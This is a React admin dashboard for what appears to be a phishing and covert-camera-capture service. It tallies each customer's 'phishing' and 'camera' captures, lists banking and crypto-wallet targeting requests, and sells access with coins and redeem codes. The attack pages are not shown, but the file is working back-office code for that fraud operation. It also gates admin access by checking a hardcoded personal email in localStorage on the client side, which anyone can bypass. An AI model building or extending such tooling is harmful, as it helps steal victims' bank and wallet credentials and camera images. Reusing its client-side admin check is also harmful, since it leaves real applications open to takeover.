import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Layout from '@/components/Layout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { 
  Users, 
  Database, 
  Trash2, 
  Plus, 
  Search,
  Eye,
  Calendar,
  Activity,
  Settings,
  Mail,
  DollarSign,
  MessageCircle,
  Gift,
  Send,
  CheckCircle
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const Admin = () => {
  const [allUsers, setAllUsers] = useState<any[]>([]);
  const [allRequests, setAllRequests] = useState<any[]>([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedUser, setSelectedUser] = useState<any>(null);
  const [coinAmount, setCoinAmount] = useState('');
  const [supportMessages, setSupportMessages] = useState<any[]>([]);
  const [redeemCodes, setRedeemCodes] = useState<any[]>([]);
  const [newCode, setNewCode] = useState('');
  const [codeAmount, setCodeAmount] = useState('');
  const [codeExpiry, setCodeExpiry] = useState('');
  const [replyMessage, setReplyMessage] = useState('');
  const [selectedSupportUser, setSelectedSupportUser] = useState<any>(null);
  const navigate = useNavigate();
  const { toast } = useToast();

  const currentUser = JSON.parse(localStorage.getItem('currentUser') || '{}');

  useEffect(() => {
    // Check if user is admin
    if (currentUser.email !== 'EmmyHenz17@gmail.com') {
      navigate('/login');
      return;
    }

    loadAdminData();
  }, [navigate]);

  const loadAdminData = () => {
    // Load all users
    const users: any[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key && key.startsWith('user_')) {
        const userData = JSON.parse(localStorage.getItem(key) || '{}');
        users.push(userData);
      }
    }
    setAllUsers(users);

    // Load all requests
    const requests = JSON.parse(localStorage.getItem('adminRequests') || '[]');
    setAllRequests(requests);

    // Load support messages
    const support = JSON.parse(localStorage.getItem('adminSupport') || '[]');
    setSupportMessages(support);

    // Load redeem codes
    const codes = JSON.parse(localStorage.getItem('redeemCodes') || '[]');
    setRedeemCodes(codes);
  };

  const deleteUser = (userId: string) => {
    if (window.confirm('Are you sure you want to delete this user?')) {
      localStorage.removeItem(`user_${userId}`);
      // Also remove user-specific data
      localStorage.removeItem(`phishing_${userId}`);
      localStorage.removeItem(`camera_${userId}`);
      
      setAllUsers(allUsers.filter(user => user.id !== userId));
      toast({
        title: 'User Deleted',
        description: 'User and all associated data has been removed.'
      });
    }
  };

  const fundUser = (userId: string) => {
    const amount = parseInt(coinAmount);
    if (!amount || amount <= 0) {
      toast({
        title: 'Invalid Amount',
        description: 'Please enter a valid coin amount.',
        variant: 'destructive'
      });
      return;
    }

    const user = allUsers.find(u => u.id === userId);
    if (user) {
      const updatedUser = {
        ...user,
        coins: (user.coins || 0) + amount,
        transactions: [
          ...(user.transactions || []),
          {
            description: `Admin funding: +${amount} coins`,
            amount: amount,
            timestamp: Date.now()
          }
        ]
      };

      localStorage.setItem(`user_${userId}`, JSON.stringify(updatedUser));
      setAllUsers(allUsers.map(u => u.id === userId ? updatedUser : u));
      setCoinAmount('');
      
      toast({
        title: 'User Funded',
        description: `Added ${amount} coins to ${user.name}'s account.`
      });
    }
  };

  const deleteRequest = (requestId: number) => {
    const updatedRequests = allRequests.filter(req => req.id !== requestId);
    setAllRequests(updatedRequests);
    localStorage.setItem('adminRequests', JSON.stringify(updatedRequests));
    
    toast({
      title: 'Request Deleted',
      description: 'Request has been removed from the system.'
    });
  };

  const createRedeemCode = () => {
    if (!newCode.trim() || !codeAmount || !codeExpiry) {
      toast({
        title: 'Error',
        description: 'Please fill all fields.',
        variant: 'destructive'
      });
      return;
    }

    const expiryDate = new Date(codeExpiry).getTime();
    if (expiryDate <= Date.now()) {
      toast({
        title: 'Error',
        description: 'Expiry date must be in the future.',
        variant: 'destructive'
      });
      return;
    }

    const code = {
      id: Date.now(),
      code: newCode.trim().toUpperCase(),
      coinAmount: parseInt(codeAmount),
      expiresAt: expiryDate,
      createdAt: Date.now(),
      isActive: true
    };

    const updatedCodes = [...redeemCodes, code];
    setRedeemCodes(updatedCodes);
    localStorage.setItem('redeemCodes', JSON.stringify(updatedCodes));

    setNewCode('');
    setCodeAmount('');
    setCodeExpiry('');

    toast({
      title: 'Code Created',
      description: `Redeem code ${code.code} created successfully.`
    });
  };

  const toggleCodeStatus = (codeId: number) => {
    const updatedCodes = redeemCodes.map(code => 
      code.id === codeId ? { ...code, isActive: !code.isActive } : code
    );
    setRedeemCodes(updatedCodes);
    localStorage.setItem('redeemCodes', JSON.stringify(updatedCodes));
  };

  const replyToSupport = (userId: string) => {
    if (!replyMessage.trim()) {
      toast({
        title: 'Error',
        description: 'Please enter a reply message.',
        variant: 'destructive'
      });
      return;
    }

    const reply = {
      id: Date.now(),
      userId: userId,
      userName: 'Admin',
      message: replyMessage.trim(),
      timestamp: Date.now(),
      isAdmin: true,
      status: 'sent'
    };

    // Add to user's support messages
    const userMessages = JSON.parse(localStorage.getItem(`support_${userId}`) || '[]');
    userMessages.push(reply);
    localStorage.setItem(`support_${userId}`, JSON.stringify(userMessages));

    setReplyMessage('');
    setSelectedSupportUser(null);

    toast({
      title: 'Reply Sent',
      description: 'Your reply has been sent to the user.'
    });
  };

  const filteredUsers = allUsers.filter(user => 
    user.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    user.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    user.id?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString();
  };

  const getTotalCapturedData = () => {
    let totalPhishing = 0;
    let totalCamera = 0;
    
    allUsers.forEach(user => {
      const phishing = JSON.parse(localStorage.getItem(`phishing_${user.id}`) || '[]');
      const camera = JSON.parse(localStorage.getItem(`camera_${user.id}`) || '[]');
      totalPhishing += phishing.length;
      totalCamera += camera.length;
    });
    
    return { totalPhishing, totalCamera };
  };

  const { totalPhishing, totalCamera } = getTotalCapturedData();

  return (
    <Layout>
      <div className="space-y-6">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-2">Admin Dashboard</h1>
          <p className="text-gray-400">Manage users, data, and system settings</p>
        </div>

        {/* Stats Overview */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-blue-500 rounded-lg flex items-center justify-center">
                  <Users className="h-5 w-5 text-white" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Total Users</p>
                  <p className="text-white text-lg font-semibold">{allUsers.length}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-orange-500 rounded-lg flex items-center justify-center">
                  <Database className="h-5 w-5 text-white" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Phishing Data</p>
                  <p className="text-white text-lg font-semibold">{totalPhishing}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-red-500 rounded-lg flex items-center justify-center">
                  <Activity className="h-5 w-5 text-white" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Camera Captures</p>
                  <p className="text-white text-lg font-semibold">{totalCamera}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-green-500 rounded-lg flex items-center justify-center">
                  <Mail className="h-5 w-5 text-white" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Requests</p>
                  <p className="text-white text-lg font-semibold">{allRequests.length}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Main Admin Interface */}
        <Tabs defaultValue="users" className="space-y-4">
          <TabsList className="grid w-full grid-cols-5 bg-slate-800/50">
            <TabsTrigger value="users" className="data-[state=active]:bg-blue-500">Users</TabsTrigger>
            <TabsTrigger value="data" className="data-[state=active]:bg-blue-500">Data</TabsTrigger>
            <TabsTrigger value="requests" className="data-[state=active]:bg-blue-500">Requests</TabsTrigger>
            <TabsTrigger value="support" className="data-[state=active]:bg-blue-500">Support</TabsTrigger>
            <TabsTrigger value="codes" className="data-[state=active]:bg-blue-500">Codes</TabsTrigger>
          </TabsList>

          {/* Users Tab */}
          <TabsContent value="users" className="space-y-4">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="text-white flex items-center gap-2">
                    <Users className="h-5 w-5" />
                    User Management
                  </CardTitle>
                  <div className="flex gap-2">
                    <div className="relative">
                      <Search className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                      <Input
                        placeholder="Search users..."
                        value={searchTerm}
                        onChange={(e) => setSearchTerm(e.target.value)}
                        className="pl-10 bg-slate-700 border-slate-600 text-white"
                      />
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  {filteredUsers.map((user) => (
                    <Card key={user.id} className="bg-slate-700/50 border-slate-600">
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div className="flex-1">
                            <div className="flex items-center gap-3 mb-2">
                              <h3 className="text-white font-semibold">{user.name}</h3>
                              <Badge className="bg-blue-500/20 text-blue-400">{user.id}</Badge>
                              <Badge className="bg-green-500/20 text-green-400">{user.status}</Badge>
                            </div>
                            <p className="text-gray-400 text-sm">{user.email}</p>
                            <div className="flex items-center gap-4 mt-2 text-sm text-gray-400">
                              <span>Coins: {user.coins || 0}</span>
                              <span>Joined: {formatDate(new Date(user.joinDate).getTime())}</span>
                            </div>
                          </div>
                          <div className="flex items-center gap-2">
                            <div className="flex items-center gap-1">
                              <Input
                                type="number"
                                placeholder="Amount"
                                value={selectedUser === user.id ? coinAmount : ''}
                                onChange={(e) => {
                                  setSelectedUser(user.id);
                                  setCoinAmount(e.target.value);
                                }}
                                className="w-20 bg-slate-600 border-slate-500 text-white text-sm"
                              />
                              <Button
                                size="sm"
                                onClick={() => fundUser(user.id)}
                                className="bg-green-500 hover:bg-green-600"
                                disabled={selectedUser !== user.id || !coinAmount}
                              >
                                <DollarSign className="h-4 w-4" />
                              </Button>
                            </div>
                            <Button
                              size="sm"
                              variant="destructive"
                              onClick={() => deleteUser(user.id)}
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Data Tab */}
          <TabsContent value="data" className="space-y-4">
            <div className="grid md:grid-cols-2 gap-6">
              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-white">All Phishing Data</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    {allUsers.map((user) => {
                      const phishingData = JSON.parse(localStorage.getItem(`phishing_${user.id}`) || '[]');
                      if (phishingData.length === 0) return null;
                      
                      return (
                        <div key={user.id} className="bg-slate-700/50 p-3 rounded-lg">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-white font-medium">{user.name}</span>
                            <Badge className="bg-orange-500/20 text-orange-400">
                              {phishingData.length} captures
                            </Badge>
                          </div>
                          <p className="text-gray-400 text-sm">User ID: {user.id}</p>
                        </div>
                      );
                    })}
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-white">All Camera Data</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    {allUsers.map((user) => {
                      const cameraData = JSON.parse(localStorage.getItem(`camera_${user.id}`) || '[]');
                      if (cameraData.length === 0) return null;
                      
                      return (
                        <div key={user.id} className="bg-slate-700/50 p-3 rounded-lg">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-white font-medium">{user.name}</span>
                            <Badge className="bg-red-500/20 text-red-400">
                              {cameraData.length} captures
                            </Badge>
                          </div>
                          <p className="text-gray-400 text-sm">User ID: {user.id}</p>
                        </div>
                      );
                    })}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Requests Tab */}
          <TabsContent value="requests" className="space-y-4">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <Mail className="h-5 w-5" />
                  User Requests
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  {allRequests.length === 0 ? (
                    <div className="text-center py-8">
                      <Mail className="h-12 w-12 text-gray-500 mx-auto mb-3" />
                      <p className="text-gray-400">No requests submitted yet</p>
                    </div>
                  ) : (
                    allRequests.map((request) => (
                      <Card key={request.id} className="bg-slate-700/50 border-slate-600">
                        <CardContent className="p-4">
                          <div className="flex items-start justify-between">
                            <div className="flex-1">
                              <div className="flex items-center gap-3 mb-2">
                                <h3 className="text-white font-semibold">{request.userName}</h3>
                                <Badge className={`${
                                  request.type === 'Banking' 
                                    ? 'bg-blue-500/20 text-blue-400'
                                    : 'bg-orange-500/20 text-orange-400'
                                }`}>
                                  {request.type}
                                </Badge>
                                <Badge className="bg-yellow-500/20 text-yellow-400">
                                  {request.status}
                                </Badge>
                              </div>
                              <p className="text-gray-400 text-sm mb-2">
                                <strong>Service:</strong> {request.bank || request.wallet}
                              </p>
                              <p className="text-gray-300 text-sm mb-2">
                                <strong>Details:</strong> {request.details}
                              </p>
                              <p className="text-gray-500 text-xs">
                                Submitted: {formatDate(request.timestamp)} | User ID: {request.userId}
                              </p>
                            </div>
                            <Button
                              size="sm"
                              variant="destructive"
                              onClick={() => deleteRequest(request.id)}
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </div>
                        </CardContent>
                      </Card>
                    ))
                  )}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Support Tab */}
          <TabsContent value="support" className="space-y-4">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <MessageCircle className="h-5 w-5" />
                  Support Messages
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  {supportMessages.length === 0 ? (
                    <div className="text-center py-8">
                      <MessageCircle className="h-12 w-12 text-gray-500 mx-auto mb-3" />
                      <p className="text-gray-400">No support messages yet</p>
                    </div>
                  ) : (
                    supportMessages.map((msg) => (
                      <Card key={msg.id} className="bg-slate-700/50 border-slate-600">
                        <CardContent className="p-4">
                          <div className="flex items-start justify-between">
                            <div className="flex-1">
                              <div className="flex items-center gap-3 mb-2">
                                <h3 className="text-white font-semibold">{msg.userName}</h3>
                                <Badge className="bg-blue-500/20 text-blue-400">{msg.userId}</Badge>
                              </div>
                              <p className="text-gray-300 mb-2">{msg.message}</p>
                              <p className="text-gray-500 text-xs">
                                {formatDate(msg.timestamp)}
                              </p>
                            </div>
                            <Button
                              size="sm"
                              onClick={() => setSelectedSupportUser(msg)}
                              className="bg-green-500 hover:bg-green-600"
                            >
                              Reply
                            </Button>
                          </div>
                        </CardContent>
                      </Card>
                    ))
                  )}
                </div>
              </CardContent>
            </Card>

            {/* Reply Modal */}
            {selectedSupportUser && (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-white">Reply to {selectedSupportUser.userName}</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    <div className="bg-slate-700/50 p-3 rounded">
                      <p className="text-gray-300 text-sm">{selectedSupportUser.message}</p>
                    </div>
                    <Input
                      placeholder="Type your reply..."
                      value={replyMessage}
                      onChange={(e) => setReplyMessage(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white"
                    />
                    <div className="flex gap-2">
                      <Button
                        onClick={() => replyToSupport(selectedSupportUser.userId)}
                        className="bg-blue-500 hover:bg-blue-600"
                      >
                        <Send className="h-4 w-4 mr-1" />
                        Send Reply
                      </Button>
                      <Button
                        onClick={() => setSelectedSupportUser(null)}
                        variant="outline"
                        className="border-gray-500 text-gray-300"
                      >
                        Cancel
                      </Button>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}
          </TabsContent>

          {/* Redeem Codes Tab */}
          <TabsContent value="codes" className="space-y-4">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <Gift className="h-5 w-5" />
                  Create Redeem Code
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
                  <Input
                    placeholder="Code (e.g., HENZ2024)"
                    value={newCode}
                    onChange={(e) => setNewCode(e.target.value.toUpperCase())}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                  <Input
                    type="number"
                    placeholder="Coin amount"
                    value={codeAmount}
                    onChange={(e) => setCodeAmount(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                  <Input
                    type="datetime-local"
                    value={codeExpiry}
                    onChange={(e) => setCodeExpiry(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                  <Button
                    onClick={createRedeemCode}
                    className="bg-green-500 hover:bg-green-600"
                  >
                    Create Code
                  </Button>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white">Active Redeem Codes</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {redeemCodes.map((code) => (
                    <Card key={code.id} className="bg-slate-700/50 border-slate-600">
                      <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                          <div>
                            <div className="flex items-center gap-3 mb-2">
                              <span className="text-white font-mono text-lg">{code.code}</span>
                              <Badge className={`${
                                code.isActive && code.expiresAt > Date.now()
                                  ? 'bg-green-500/20 text-green-400'
                                  : 'bg-red-500/20 text-red-400'
                              }`}>
                                {code.isActive && code.expiresAt > Date.now() ? 'Active' : 'Inactive'}
                              </Badge>
                              <Badge className="bg-yellow-500/20 text-yellow-400">
                                {code.coinAmount} coins
                              </Badge>
                            </div>
                            <p className="text-gray-400 text-sm">
                              Expires: {new Date(code.expiresAt).toLocaleString()}
                            </p>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => toggleCodeStatus(code.id)}
                            className={code.isActive ? 'bg-red-500 hover:bg-red-600' : 'bg-green-500 hover:bg-green-600'}
                          >
                            {code.isActive ? 'Deactivate' : 'Activate'}
                          </Button>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </Layout>
  );
};

export default Admin;
